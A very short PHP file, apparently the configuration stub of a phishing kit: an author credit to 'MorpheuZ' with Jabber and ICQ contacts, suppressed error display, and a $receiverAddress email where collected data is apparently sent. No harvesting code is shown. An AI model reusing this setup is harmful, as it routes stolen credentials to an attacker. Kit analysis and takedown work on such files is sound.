<?php
/*
 * 4ker by MorpheuZ
 * Jabber: morpheuslink@jabb3r.org
 * ICQ: 745065274
 */
ini_set('display_errors', 0);
$receiverAddress = "rol.g1@yandex.com";


?>